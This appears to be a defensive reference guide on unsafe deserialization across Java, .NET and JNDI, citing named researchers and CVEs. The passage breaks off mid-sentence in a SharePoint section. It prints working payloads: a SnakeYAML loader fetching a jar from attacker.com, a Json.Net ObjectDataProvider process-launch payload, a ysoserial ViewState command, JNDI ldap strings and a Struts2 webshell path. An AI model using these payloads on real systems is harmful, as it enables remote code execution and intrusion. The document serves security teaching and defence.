# Staff-Level Deserialization Security Guiding Principles
## Synthesized from Chris Frohoff, Alvaro Muñoz, Oleksandr Mirosh, Markus Wulftange, and Moritz Bechler

> **Currency marker:** Last refreshed 2026-06-09 (added: SnakeYAML 2.0/CVE-2022-1471 version
> nuance, JavaScript/Node `node-serialize` CVE-2017-5941 section, Go type-safe-by-design contrast,
> and Appendix A reference corpus of toy vuln/safe pairs for regression tests). Prior refresh
> 2026-05-13. The 2024-2026 deepening pulls in ML-era pickle
> research (PickleScan CVE-2025-1716 / CVE-2025-10155/10156/10157, nullifAI HF campaign,
> safetensors as defensive primitive), Java continuations (CVE-2024-53677 Struts2 mass-assignment,
> Spring CVE-2025-41249, Jackson polymorphic guidance shift to `PolymorphicTypeValidator`),
> .NET continuations (CVE-2025-49704 SharePoint ToolShell, CVE-2025-59287 WSUS SoapFormatter),
> and Ruby Marshal evolution (Luke Jahnke 2024 universal RCE, Doyensec/Giovannini Ruby 3.4
> gadget, Trail of Bits 2025 retrospective).

> **Corpus correction:** The fifth researcher is **Moritz Bechler** (not "Morris Bechler"). No
> security researcher named "Morris Bechler" exists in any public record.

> **Researchers:**
> - **Chris Frohoff** (@frohoff) — ysoserial author; AppSecCali 2015 "Marshalling Pickles"
>   (with Gabriel Lawrence); Qualcomm red-team work
> - **Alvaro Muñoz** (@pwntester) — Principal Security Researcher, GitHub Security Lab; ysoserial.net
>   co-author; Black Hat 2016 JNDI/LDAP injection, 2017 "Friday the 13th JSON Attacks" (both with
>   Mirosh); Text4Shell discoverer; CodeQL-based taint analysis at scale
> - **Oleksandr Mirosh** — HPE/Micro Focus Security Research; co-discoverer of ObjectDataProvider
>   (.NET) gadget and JNDI injection formalization; Black Hat 2016 + 2017
> - **Markus Wulftange** — Principal Security Researcher, CODE WHITE GmbH (Ulm); RichFaces EL
>   bypass, Liferay JSON RCE, Exchange/DevExpress serialization binder bypass, .NET Remoting
>   research, ASP.NET TemplateParser gadgets, WSUS SoapFormatter RCE (CVE-2025-59287)
> - **Moritz Bechler** — SySS GmbH; "Java Unmarshaller Security" paper + marshalsec tool;
>   JEP 290 and JNDI patch evolution analysis; C3P0 gadget contribution to ysoserial
>
> **Modern-era contributors (2024-2026):**
> - **Luke Jahnke** (elttam, then independent) — Ruby 2.x universal Marshal gadget chain (2018);
>   "Ruby 3.4 Universal RCE Deserialization Gadget Chain" (2024-11-24); "Gem::SafeMarshal escape"
>   (2024-12-03)
> - **Leonardo Giovannini** (Doyensec) — Ruby 3.4 Marshal gadget chain (2024-10-16)
> - **Peter Stöckli** (GitHub Security Lab) — Ruby unsafe-deserialization corpus (2024-06-20)
>   covering JSON / XML / YAML / Marshal vectors with PoCs
> - **JFrog Security Research** — PickleScan zero-day cluster (
>   CVE-2025-10155 extension mismatch, CVE-2025-10156 ZIP CRC bypass, CVE-2025-10157 submodule
>   import bypass); nullifAI Hugging Face campaign analysis (2024-02 - 2025-02)
> - **HiddenLayer Research** — "Silent Sabotage" safetensors-conversion hijack on Hugging Face
>   (2024); OpenAI Privacy Filter impersonation campaign analysis (2026, 244k downloads)
> - **Viettel Cyber Security** (via ZDI / Pwn2Own Berlin 2025) — ToolShell SharePoint chain
>   (CVE-2025-49704 + CVE-2025-49706, May 2025); ExcelDataSet CompressedDataTable BinarySerialization
>   sink
>
> Sources: AppSecCali 2015/OWASP SD slides; Black Hat 2016/2017 papers; GitHub/ysoserial/
> ysoserial.net/marshalsec; mbechler.github.io; codewhitesec.blogspot.com / code-white.com/blog;
> GitHub Security Lab advisories; OSS-Security mailinglist; NVD; Speaker Deck; Trail of Bits blog;
> JFrog Security Research; HiddenLayer Research; Kaspersky Securelist; Akamai Security Research.
>
> **Cross-links to neighboring expertise docs:**
> - `adversarial_ml_model_security_expertise.md` — ML pickle gadgets, weight tampering, training-
>   pipeline deserialization sinks
> - `llm_agent_security_expertise.md` — agent tool-output deserialization, Pydantic as defensive
>   primitive
> - `supply_chain_provenance_expertise.md` — model-card provenance, signing
> - `cicd_supply_chain_expertise.md` — pickle in CI artifact stores, joblib/sklearn pipelines

---

## 1. Core Philosophy

### Deserialization is Property-Oriented Programming — not a "missing input validation" bug

Frohoff's foundational frame from AppSecCali 2015 applies across all languages and formats: unsafe
deserialization is the runtime equivalent of Return-Oriented Programming. The attacker does not
inject code; they construct a **gadget chain** — a sequence of invocations through existing,
legitimate library methods — that collectively achieve arbitrary code execution. The dangerous
primitive is the deserialization mechanism itself; the gadgets are ammunition that the classpath
or assembly provides.

This is why input sanitization does not fix deserialization vulnerabilities. Filtering serialized
bytes, blocking certain class names, or sanitizing string parameters are all attempts to patch
symptoms of an architectural flaw: **the application is executing attacker-controlled behavior
during data ingestion.**

### The vulnerability is in the deserializing application, not in the gadget libraries

From ysoserial's README: "The vulnerability lies in the application performing unsafe
deserialization and NOT in having gadgets on the classpath." Patching Apache Commons Collections
(the first gadget library to be publicly blacklisted) does not fix the vulnerability — it only
removes one weapon. The application still deserializes attacker-controlled objects. The attacker
finds a gadget in the next library on the classpath.

Bechler's paper extends this: "No matter how the unmarshalling process is performed and what
implicit constraints are in place, it is prone to similar exploitation techniques." The
vulnerability class is architectural; the format (binary Java serialization, XML, JSON, YAML,
AMF, Hessian) is implementation detail.

### Format switching is not a fix

Muñoz and Mirosh's "Friday the 13th" paper (Black Hat 2017) was a direct rebuttal to the
post-2015 advice to "switch from Java serialization to JSON." They demonstrated that the most
popular JSON libraries in both Java and .NET are exploitable for RCE when type information is
user-controlled — not via some obscure corner case but via the explicit polymorphic typing
features those libraries advertise as features (`TypeNameHandling` in Json.Net,
`enableDefaultTyping()` in Jackson, `@type` in FastJSON). The lesson: the format is not the
problem. The problem is deserializing attacker-controlled type information.

### The patch treadmill: blacklisting is permanently broken

Jackson-databind accumulated 30+ CVEs as the maintainer added one gadget class to a blacklist
after each published exploit. Bechler documented the same pattern for JNDI patches: RMI
codebase loading blocked in Java 8u121, LDAP codebase loading blocked in Java 8u191, then JNDI
factory-class attacks emerged using classes already on the local classpath. The only
architecturally sound fix is an **allowlist** (only known-safe types can be deserialized) or
removing the deserialization of untrusted data entirely.

---

## 2. Java Native Serialization (ObjectInputStream)

### The sink and its triggers

`ObjectInputStream.readObject()` is the canonical Java deserialization sink. During
deserialization, the JVM:
1. Reconstructs object graphs by reading class descriptors from the stream
2. Calls `readObject()` on any class that implements it (before the application's code sees the
   object)
3. Calls `readResolve()` if implemented
4. Calls `finalize()` when the object is eventually GC'd (a delayed trigger)

The wire format is identifiable: magic bytes `0xACED 0x0005` followed by a typed stream.
Any endpoint that receives arbitrary bytes and passes them to `ObjectInputStream.readObject()`
is potentially exploitable if gadget classes are on the classpath.

### The CommonsCollections gadget family (Frohoff)

The foundational gadget chain, using Apache Commons Collections 3.x:

```
AnnotationInvocationHandler.readObject()         (the entry point — has readObject())
  → LazyMap.get()                                 (triggered by proxy call)
    → ChainedTransformer.transform()
      → ConstantTransformer(Runtime.class)
      → InvokerTransformer("getMethod", ["exec"])
      → InvokerTransformer("invoke", [null])      (returns Runtime instance)
      → InvokerTransformer("exec", [command])     (Runtime.exec(command))
```

`InvokerTransformer.transform()` calls arbitrary methods via reflection — this is the gadget's
power. The chain abuses the `Transformer` composition mechanism in a library designed for data
transformation pipelines, not for security-sensitive contexts.

**Why so many CC variants exist:** The original CC1 required Java <8u71 due to changes in
`AnnotationInvocationHandler`. CC5/CC6/CC7 were developed to restore compatibility with patched
JDKs. CC2/CC4 target Commons Collections 4.x with `TransformingComparator`. Each variant uses
a different entry-class trigger while sharing the core `InvokerTransformer` execution.

### TemplatesImpl: the bytecode execution primitive

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` (internal JDK class) loads
arbitrary Java bytecode from its `_bytecodes` field when `getOutputProperties()` or
`newTransformer()` is called. This provides a **bytecode execution primitive** — the attacker
provides a serialized `TemplatesImpl` with custom bytecode; any gadget that eventually calls
`newTransformer()` or `getOutputProperties()` achieves arbitrary class execution.

Chains that reach TemplatesImpl: CommonsCollections2/3/4, CommonsBeanutils1,
ROME, Click1, Vaadin1, JSON1. The pattern is: BeanComparator or similar triggers a
getter via reflection → getter is `getOutputProperties()` → bytecode loaded.

### URLDNS: detection without RCE

The `URLDNS` payload (JDK-only, no external dependencies) causes a DNS lookup without triggering
code execution. Mechanism:

```
HashMap.readObject() → HashMap.putVal() → HashMap.hash(key)
  → URL.hashCode() → URLStreamHandler.hashCode()
    → URLStreamHandler.getHostAddress() → InetAddress.getByName(host)
```

The `URL` class performs DNS resolution as a side effect of `hashCode()`. The hash is reset via
reflection before serialization so it triggers fresh resolution on deserialization. Used to
detect deserialization sinks via out-of-band DNS interaction (Burp Collaborator / interactsh)
without risking active exploitation. **Always probe with URLDNS before sending RCE payloads.**

### JEP 290: serialization filters and their limits

Java 9 introduced JEP 290, a serialization filter mechanism that allows allowlisting/denylisting
class names before object graphs are constructed. Applied by default to RMI registries and DGC.
This killed the `RMIRegistryExploit` and `JRMPClient` payloads against JEP-290-hardened
registries.

Bypass (An Trinh, 2019): the filter is applied to server-side deserialization of incoming data.
But if the server acts as an RMI **client** connecting to an attacker-controlled registry, no
filter is applied to the client's deserialization of the registry's responses. Trick the server
into connecting back to an attacker's registry → deliver payload to the unfiltered client path.

### JRMPClient/JRMPListener: multi-stage exploitation

A two-stage technique enabling delivery of full ysoserial payloads even when the initial payload
size is limited or when the initial deserialization endpoint doesn't have useful gadgets:

1. **Stage 1 (JRMPClient):** Initial serialized payload causes the target to connect to an
   attacker-controlled JRMP (Java Remote Method Protocol) listener.
2. **Stage 2 (JRMPListener):** The attacker's JRMP server delivers the actual RCE payload in the
   server-to-client response, which the target deserializes without additional input constraints.

Bechler developed this technique for Jenkins (CVE-2016-0788). The `JRMPClient` and
`JRMPListener` payloads in ysoserial implement this directly.

### Modern JDK gadget failures and workarounds

From Florian Hauser (CODE WHITE) on JDK 15+ / JDK 16+:

**What broke and why:**
- `CommonsCollections6`: `InaccessibleObjectException` when making `HashSet.map` accessible via
  reflection (JDK 16+ JPMS encapsulation, JEP 396)
- `CommonsBeanutils1`: `PropertyUtilsBean` cannot access `TemplatesImpl` because `java.xml` does
  not export its package
- Nashorn-based execution gadgets: Nashorn removed entirely in JDK 15 (JEP 372)

**Workarounds:**
- On JDK < 16, use `--add-opens java.base/java.util=ALL-UNNAMED` (and package equivalents) when **generating**
  payloads with ysoserial — opens fields for reflection during payload construction, even though
  the target JVM can't receive `--add-opens` injections at runtime
- Replace Nashorn execution with **JShell API** (`jdk.jshell.JShell.create().eval(javaCode)`),
  available since JDK 9. Requires fully-qualified class names in the eval'd code
  (e.g., `java.lang.Runtime.getRuntime().exec("id")`). Detection tip: monitor for JShell API
  usage in production, not just `Runtime.exec()`

### Java post-2024 continuation: OGNL mass-assignment as a deserialization-adjacent class

The classic Struts2 OGNL-RCE lineage (CVE-2017-5638 / Equifax, CVE-2018-11776, CVE-2020-17530)
continued in **CVE-2024-53677** (Apache Struts2, disclosed December 2024, actively exploited
within days). Mechanism per Dynatrace + EQSTLab analysis:

1. Vulnerable Struts2 file-upload interceptor accepts a parameter named with the OGNL
   "stack-top" keyword: `top.fileFileName=../usr/local/tomcat/webapps/ROOT/shell.jsp`.
2. `Parameters` interceptor evaluates the parameter name as an OGNL expression against the
   ValueStack; `top` resolves to the action object.
3. The framework's mass-assignment populates `fileFileName` on the action; the subsequent
   `FileUploadInterceptor` copy uses this attacker-controlled path as the destination.
4. Path traversal places the uploaded file (renamed to `.jsp`) in the web root → JSP execution.

This is **not classical Java deserialization** (no `ObjectInputStream`, no ysoserial gadget),
but it belongs in the deserialization expertise corpus because the underlying flaw is
identical: **the framework constructs object state from attacker-controlled type-or-name
information**. The OGNL ValueStack is a deserialization-like primitive (read property paths
from untrusted input → invoke setters via reflection) that has accumulated 8+ critical RCEs
across a decade. Affected versions: Struts 2.0.0-2.3.37 (EOL), 2.5.0-2.5.33, 6.0.0-6.3.0.2;
fix: 6.4.0+, complete in 7.0.0 where the legacy mechanism is fully removed.

Sources: `dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/`,
`blog.qualys.com/vulnerabilities-threat-research/2024/12/16/critical-apache-struts-file-upload-vulnerability-cve-2024-53677-risks-implications-and-enterprise-countermeasures`,
EQSTLab PoC `github.com/EQSTLab/CVE-2024-53677`.

### Spring Framework 2025: annotation-detection authorization gaps

CVE-2025-41248 (Spring Security) + CVE-2025-41249 (Spring Framework, fixed in 6.2.11 /
5.3.45 / 6.1.23) are **method-security annotation detection failures** when annotations sit on
methods with parameterized supertypes with unbounded generics. Not a deserialization sink per
se, but creates an authorization bypass on endpoints whose payload is then routed into
Jackson / Spring-Web deserialization — a common precondition for chained exploitation in
post-2024 Spring RCE corpora. Maintain the historical pairing: CVE-2016-1000027 (Spring
`HttpInvokerServiceExporter` BinaryFormatter-equivalent sink) was deprecated in Spring 6.x by
removing the `spring-web` HTTP-Invoker remoting surface entirely; legacy 5.x deployments still
ship the sink.

Sources: `spring.io/security/cve-2025-41249/`,
`spring.io/blog/2025/09/15/spring-framework-and-spring-security-fixes-for-CVE-2025-41249-and-CVE-2025-41248/`.

---

## 3. Alternative Java Marshallers (Bechler / marshalsec)

### The universality principle

Bechler's "Java Unmarshaller Security" paper (May 2017) demonstrated that the vulnerability
class is not specific to `ObjectInputStream`. He analyzed 13+ marshalling libraries and found
each exploitable, often with JDK-only gadgets. The key insight was distinguishing two marshaller
types by what code they invoke during deserialization:

**Field-based marshallers:** Set fields directly (like ObjectInputStream). Entry is through
`readObject()` / `readResolve()` / `finalize()`. `TemplatesImpl` bytecode execution is the
typical terminal gadget.

**Bean property based marshallers:** Call setter methods (like SnakeYAML, Jackson). "Far more
code can be triggered directly during unmarshalling" because public setter methods are part of
any class's attack surface — any class with a `setXxx(String)` that performs a dangerous
operation is a potential gadget. `JdbcRowSetImpl.setDataSourceName()` + `setAutoCommit(true)` is
the prototypical bean-property gadget.

### Exploitation techniques (four vectors, all marshallers)

**1. System command execution** — direct `Runtime.exec()` via gadget chain.

**2. Remote classloading via JNDI reference indirection:**
Attacker serves LDAP or RMI server. Gadget triggers `InitialContext.lookup(attacker_url)`.
JNDI server returns a `Reference` pointing to attacker's codebase. JVM fetches and instantiates
factory class. Blocked in modern JVMs (RMI codebase: Java 8u121; LDAP codebase: Java 8u191 /
CVE-2018-3149). Post-patch bypass: use factory classes on the local classpath (e.g.,
`org.apache.naming.factory.BeanFactory` from Tomcat) that invoke methods via EL evaluation.

**3. ServiceLoader mechanism:**
Leverage `javax.script.ScriptEngineFactory` SPI. `ServiceLoader.load()` reads
`META-INF/services/javax.script.ScriptEngineFactory` from classpath. If attacker can write a
JAR to a classpath location (via file-write primitive), they register a malicious SPI
implementation that executes during `ScriptEngineManager` initialization.

**4. Native Java deserialization (embedded):**
When a non-ObjectInputStream marshaller allows embedding serialized Java blobs (e.g., Hessian
can serialize arbitrary `Serializable` objects, BlazeDS AMF encodes Java objects), fall back to
ysoserial gadget chains inside the embedded blob. The outer marshaller's format is irrelevant;
the inner `ObjectInputStream` is the actual sink.

### Marshallers and their attack surface

| Marshaller | Format | Key Vector | JDK-only? |
|------------|--------|-----------|-----------|
| SnakeYAML | YAML | Bean property setters; `!!` constructor syntax | Yes |
| Jackson | JSON | Bean setters via `enableDefaultTyping()` / `@JsonTypeInfo` | Yes (JdbcRowSetImpl) |
| XStream | XML | Dynamic proxy gadget; sorted set gadgets | Yes |
| Hessian/Burlap | Binary/XML | Embedded Java serialization | Via embedded ysoserial |
| BlazeDS AMF | Binary | AMF3 type info; embedded Java objects | Via embedded + third-party |
| JSON-IO | JSON | Default type metadata instantiates arbitrary classes | Yes |
| jYAML / YAMLBeans | YAML | Constructor/setter-based | Yes / third-party |
| Kryo | Binary | Instantiation-dependent; KryoAltStrategy: JDK-only | Strategy-dependent |
| Java XMLDecoder | XML | Pre-existing well-known issue | Yes |
| Red5 AMF | Binary | JDK-only RCE | Yes |
| Castor | XML | POM dependency RCE | No |

### SnakeYAML: the `!!` constructor attack

SnakeYAML's `!!` syntax invokes arbitrary Java constructors with YAML-provided arguments:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]
```

This instantiates `URLClassLoader` with an attacker's URL, then passes it to
`ScriptEngineManager` — which calls `ServiceLoader.load()` → loads `META-INF/services/
javax.script.ScriptEngineFactory` from the attacker's JAR → instantiates the factory class →
arbitrary code execution. **No external dependencies beyond JDK. No gadget chain.**

Fix: `new Yaml(new SafeConstructor())`. The `SafeConstructor` disables `!!` type instantiation.

**Version nuance (currency, correctness-critical for rule authoring):** the blanket "any default
`Yaml()` is unsafe" rule holds only for **SnakeYAML 1.x**. SnakeYAML **2.0** (released February
2023, the fix for **CVE-2022-1471**) changed the default `Constructor` to inherit from
`SafeConstructor` and to **block all global tags by default** via a `TagInspector` whose default
`isGlobalTagAllowed` returns `false`. On 2.0+, a bare `new Yaml().load(untrusted)` throws on a
`!!com.foo.Bar` global tag rather than instantiating it. The dangerous 2.0+ patterns are therefore
narrower: (a) explicitly re-enabling global tags via `loaderOptions.setTagInspector(tag -> true)`,
(b) constructing with an explicit `new Constructor(SomeType.class, loaderOptions)` that widens the
allowlist, or (c) a pinned/transitive SnakeYAML 1.x dependency (extremely common — many libraries
still ship 1.x transitively). Audit pattern: don't just grep `new Yaml()` — resolve the SnakeYAML
version, and on 2.0+ grep for `setTagInspector` / `isGlobalTagAllowed` overrides returning `true`.

Sources: `veracode.com/blog/resolving-cve-2022-1471-snakeyaml-20-release-0/`,
`snyk.io/blog/snakeyaml-unsafe-deserialization-vulnerability/`, NVD CVE-2022-1471.

### Bechler's C3P0 bridging gadget

Bechler contributed the C3P0 payload to ysoserial (@mbechler credited); that payload uses
`PoolBackedDataSource` JNDI `Reference` remote class loading. A separate C3P0 gadget
bridges from JSON/YAML deserialization (bean-property marshallers) to native Java deserialization
gadget chains:

```
WrapperConnectionPoolDataSource.setUserOverridesAsString(attacker_string)
  → C3P0ImplUtils.parseUserOverridesAsString()
    → ByteArrayInputStream(hex-decode(embedded_blob))
      → ObjectInputStream.readObject()           ← ysoserial payload goes here
```

`WrapperConnectionPoolDataSource` has a `userOverridesAsString` setter that parses a string
containing a hex-encoded serialized Java object. Any JSON/YAML marshaller that calls setters
on `WrapperConnectionPoolDataSource` will trigger native Java deserialization of attacker-
controlled bytes — enabling reuse of the full ysoserial gadget library through a non-Java format.

---

## 4. JNDI Injection (Muñoz + Mirosh, Black Hat 2016)

### The injection class

Applications passing user-controlled strings to `javax.naming.InitialContext.lookup()` (or
`getAttributes()`, `search()`, `getNameParser()`, `list()`) are vulnerable. The attacker
provides a URL like `rmi://attacker/exploit` or `ldap://attacker/exploit`.

**Critical detail from the paper:** The injection is not limited to `lookup()`. Methods like
`getAttributes("user/supplied/path")` internally call `lookup()` on the first path component of
a composite JNDI name. This multiplies the attack surface — anywhere the application makes
directory API calls with user-influenced data is potentially injectable.

### Three delivery vectors

**RMI:** Attacker's RMI registry returns a `Reference` with `classFactory` + `classFactoryLocation`
pointing to attacker's codebase. JVM fetches and instantiates the named factory class.
- **Blocked:** Java 8u121 (com.sun.jndi.rmi.object.trustURLCodebase = false by default)
- **Post-patch bypass:** Use `org.apache.naming.factory.BeanFactory` (present in Tomcat). Its
  `forceString` Reference attribute remaps a setter to an arbitrary method such as
  `javax.el.ELProcessor.eval()` → EL evaluation → RCE without remote codebase.

**LDAP:** Attacker's LDAP server returns either (a) a `Reference` with codebase URL, or (b) a
directly serialized Java object (`javaSerializedData` attribute).
- **Reference/codebase blocked:** Java 8u191 (CVE-2018-3149)
- **Serialized Java objects still work** if ysoserial gadgets exist on the classpath. Modern
  LDAP path: return serialized Java object via `javaSerializedData` → ysoserial chain executes.

**CORBA/IIOP:** IOR references invoke remote object factories. Analogous impact to RMI.

### Log4Shell: the same vulnerability at trillion-dollar scale

The 2016 Muñoz/Mirosh paper described exactly the mechanism exploited by CVE-2021-44228
(Log4Shell) five years later. Log4j 2.x's message pattern evaluator called `JNDI.lookup()` on
any `${jndi:ldap://attacker/exploit}` string appearing in log messages. Because logs commonly
contain user-controlled input (HTTP headers, usernames, form fields), essentially every internet-
facing Java application running Log4j 2.x was vulnerable.

Bechler published a Log4Shell JNDI state-of-the-art post on December 10, 2021 (day zero of
disclosure) documenting what still worked post-patches:
1. **Local-classpath factory attacks** (BeanFactory + EL): work regardless of JDK version
2. **Deserialization via RMI/LDAP**: serialize a ysoserial payload via LDAP's `javaSerializedData`
3. **CORBA/IIOP**: impact very similar to RMI

His conclusion: "A current Java runtime version won't save you. Do patch." (The fix is disabling
JNDI lookup from message patterns in Log4j itself, not patching the JDK.)

### JNDI injection via certificate validation (Bechler, CVE-2018-2633)

An attacker can trigger JNDI injection via the **X.509 certificate validation path** — no
application-level injection required. When `com.sun.security.enableAIAcaIssuers=true` or CRL
checking is enabled, the JVM fetches intermediate CA certificates from URIs in the
`AuthorityInformationAccess` extension:

1. Attacker creates a certificate with `caIssuers` URI = `ldap://attacker/o=exploit/bar`
2. Java calls `LDAPCertStore.LDAPRequest.getValueMap()` → `ctx.getAttributes(name, attrIds)`
3. `name` is treated as a JNDI composite name → first component resolved via `Context.lookup()`
4. Attacker's LDAP server returns `Reference` → factory class fetched → RCE

**Key insight:** No certificate validation has occurred before `caIssuers` is fetched — it's
fetched to *build* the chain. A crafted certificate with a malicious `caIssuers` URI is
sufficient. This applies to any Java application that validates certificates with AIA enabled.

---

## 5. .NET Deserialization

### The formatter hierarchy: BinaryFormatter is the worst, none are safe when abused

**.NET formatter risk taxonomy:**

| Formatter | Format | Type Info | Danger Level |
|-----------|--------|----------|--------------|
| BinaryFormatter | Binary | Full CLR type | Critical — officially deprecated |
| SoapFormatter | SOAP XML | Full CLR type | Critical — same risk as BinaryFormatter |
| NetDataContractSerializer | XML | Full CLR type | Critical |
| LosFormatter / ObjectStateFormatter | Binary/B64 | Full CLR type | Critical (ViewState) |
| DataContractSerializer | XML | Known-types only | Medium — can be bypassed with attacker-controlled type |
| XmlSerializer | XML | Specified type only | Medium — dangerous when attacker controls Type |
| JavaScriptSerializer | JSON | Optional resolver | Medium — dangerous with custom TypeResolver |
| Json.Net (Newtonsoft) | JSON | Optional `$type` | Medium — dangerous with TypeNameHandling != None |
| DataContractJsonSerializer | JSON | Optional known-types | Medium |
| FastJSON | JSON | Always includes `@type` | High — type always included |

**BinaryFormatter is dead.** Microsoft deprecated it in .NET 5, disabled it by default in
.NET 8, and removed the in-box implementation in .NET 9. Any codebase still using BinaryFormatter should be
treated as a critical vulnerability regardless of other mitigations.

### ObjectDataProvider: the universal .NET gadget (Muñoz + Mirosh)

`System.Windows.Data.ObjectDataProvider` is a WPF data-binding helper. During deserialization,
setting its properties causes method invocation via `QueryWorker()`:

```
ObjectDataProvider.ObjectType = typeof(System.Diagnostics.Process)
ObjectDataProvider.MethodName = "Start"
ObjectDataProvider.MethodParameters = new ArrayList { shellCommand }
```

On deserialization (or on property binding evaluation), `ObjectDataProvider.QueryWorker()` →
`InvokeMethodOnInstance()` → `Process.Start(command)`. This gadget works across:
BinaryFormatter, NetDataContractSerializer, SoapFormatter, Json.Net
(TypeNameHandling ≠ None), JavaScriptSerializer (with custom resolver), DataContractSerializer
(with attacker-controlled type), XmlSerializer (with attacker-controlled type), XAML
deserialization, YamlDotNet <5.0.0, FastJSON.

This is the **primary .NET deserialization gadget** and is credited to Oleksandr Mirosh and
Alvaro Muñoz in the ysoserial.net README.

### ViewState exploitation: hardcoded keys at enterprise scale

ASP.NET ViewState is an `ObjectStateFormatter`/`LosFormatter`-serialized blob that is cryptographically signed (and optionally encrypted) using the `MachineKey` from `web.config`.

**CVE-2020-0688 (Exchange Server):** Microsoft Exchange installations had the same `MachineKey`
values (`validationKey`, `decryptionKey`) hardcoded in the default installation. Every Exchange
server had the same key. Any authenticated low-privilege user could:
1. Obtain the hardcoded key values (identical in every installation's `web.config`)
2. Generate a malicious ViewState blob using ysoserial.net's ViewState plugin
3. POST it to any Exchange page → SYSTEM RCE

Impact: every Exchange Server installation worldwide was vulnerable with a single static key.
The tool invocation: `ysoserial.exe -p ViewState -g TextFormattingRunProperties
--validationkey=<key> --validationalg=SHA1 -c "cmd /c whoami"`.

Broader lesson: **any ASP.NET application with a known or guessable MachineKey is fully
compromised via ViewState.** Keys exposed in public Git repositories, default installations,
or documentation are effective attack vectors.

### Json.Net TypeNameHandling: the most dangerous "feature" in .NET JSON

Newtonsoft.Json (Json.Net) is safe by default. It becomes exploitable when:
- `TypeNameHandling` is set to `All`, `Objects`, or `Auto` in `JsonSerializerSettings`
- The JSON payload contains `$type` discriminators

Attack payload:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0,...",
  "MethodName": "Start",
  "ObjectType": {
    "$type": "System.Type, mscorlib",
    "Value": "System.Diagnostics.Process"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["calc.exe"]
  }
}
```

Mitigation: `TypeNameHandling = None`. For any app that requires polymorphic type handling,
use a custom `SerializationBinder` that validates against an explicit allowlist — but see
Wulftange's binder bypass research before trusting this.

### Serialization binder bypass (Wulftange, 2022)

The standard mitigation for BinaryFormatter vulnerabilities is a custom `SerializationBinder`
that overrides `BindToType()` to validate class names against a blacklist or whitelist. Wulftange
discovered a systematic bypass in how the .NET runtime handles binder failures:

**The bypass:**
1. Custom `BindToType()` fails to resolve a type (returns `null`)
2. `ObjectReader.FastBindToType()` activates as fallback
3. `FastBindToType()` with `FormatterAssemblyStyle.Simple` calls `Type.GetType()`, which accepts
   fully-qualified Assembly Qualified Names (AQNs)
4. The attacker crafts a payload whose assembly/type name **string-matches** as safe to the
   binder's checks but contains AQN formatting that causes the binder to return `null` (failing
   validation), while `FastBindToType()` resolves the actual dangerous type from the embedded AQN

**CVE-2022-28684 (DevExpress `SafeSerializationBinder`):**
`EnsureAssemblyQualifiedTypeName()` validates using string matching on assembly names. By
crafting a type name like `System.Data.DataSet` with a malformed assembly name suffix `", x=]"`,
the validator returns `false` early (skips validation), but `FastBindToType()` successfully
resolves `System.Data.DataSet` → DataSet gadget → RCE.

**CVE-2022-23277 (Microsoft Exchange `ChainedSerializationBinder`):**
Exchange's binder resolves then validates. Crafting the assembly/type parameters to cause
`LoadType()` to fail causes validation to be skipped, and `FastBindToType()` provides full AQN
resolution. All type restrictions bypass. Required: low-privilege authenticated Exchange user.

**Implication:** Custom `SerializationBinder` implementations are not reliable mitigations for
BinaryFormatter vulnerabilities. The only reliable fix is to not use BinaryFormatter.

### .NET Remoting: deprecated but not gone

.NET Remoting (deprecated since .NET 2.0, present in .NET Framework indefinitely) uses
BinaryFormatter or SoapFormatter internally. Wulftange's 2022–2024 research documented a
progression of attacks:

**Basic .NET Remoting (2022):**
- ObjRef gadget: upon deserialization, creates a `RemotingProxy` targeting attacker's server
- RogueRemotingServer: delivers raw BinaryFormatter/SoapFormatter payload to incoming connections
  (analog of ysoserial's JRMPListener for Java RMI)

**ObjRef leaking via CVE-2024-29059:**
`HttpHandlerTransportSink.HandleRequest()` allowed HTTP request headers to overwrite trusted
values. Malformed .NET Remoting HTTP requests caused exception handling in
`SoapServerFormatterSink` to include a serialized `MarshalByRefObject` from the
`LogicalCallContext` in the error response. If any of these libraries are in the application's
dependency tree (Application Insights, DataDog Trace, Microsoft.Extensions.Caching.Memory,
`System.Diagnostics.DiagnosticSource`), a `MarshalByRefObject` is placed in the call context
automatically, leaking an `ObjRef` to unauthenticated callers.

**Teaching old tricks (July 2024 — three CAS bypass techniques):**
Even with `TypeFilterLevel.Low` (restricts what types can be marshaled) and Code Access Security
enabled, Wulftange found three bypasses for hardened .NET Remoting:
1. **CAS bypass via privileged Assert:** `BuildManager.CreateCachedFile()` contains a
   `FileIOPermission.Assert()` → writes `UserCache.dll` to ASP.NET temp → auto-loaded → RCE
2. **Server-serialized MarshalByRefObject:** Force `SoundPlayer` to serialize by value → stored
   in `LogicalCallContext` → returned in server response → client gets proxy → arbitrary calls
3. **Exception-propagated WebClient:** Store `WebClient` in `Exception.Data` →
   `ExceptionDispatchInfo.Capture().Throw()` → propagates to client as `RemotingProxy` → SSRF/
   file write

Apache log4net's response to this research: removed `RemotingAppender` entirely in 3.0.0.

### SharePoint ToolShell (CVE-2025-49704 / CVE-2025-49706 / CVE-2025-53770 / CVE-2025-53771, 2025)

The 2025 high-water mark for .NET deserialization exploitation. Originally disclosed by
**Viettel Cyber Security** at Pwn2Own Berlin (May 2025) via Trend Micro's ZDI; weaponized
in-the-wild by mid-July 2025; Microsoft credited Viettel for the responsible disclosure of the
underlying chain. CISA added CVE-2025-53770 to KEV on July 20, 2025. Per Kaspersky
Securelist, Akamai, and Trellix technical analyses:

**The chain (logical):**
1. **CVE-2025-49706 / CVE-2025-53771** — authentication bypass: `PostAuthenticateRequestHandler`
   does a case-insensitive `Referer`-header match against sign-out paths
   (`/_layouts/15/SignOut.aspx`). A crafted `Referer` set to a sign-out path causes
   the handler to skip authentication checks for the request entirely.
2. **CVE-2025-49704 / CVE-2025-53770** — XML deserialization sink at
   `/_layouts/15/ToolPane.aspx` POST. Parameters `MSOtlPn_Uri` (pointer to a CONTROLTEMPLATES
   file) + `MSOtlPn_DWP` (attacker-supplied WebPart markup) are deserialized via SharePoint's
   WebPart XML deserializer.
3. **The gadget**: an `ExcelDataSet` control from
   `Microsoft.PerformancePoint.Scorecards.Client.dll` is instantiated; its
   `CompressedDataTable` property is set to a base64-encoded **BinaryFormatter** payload; the
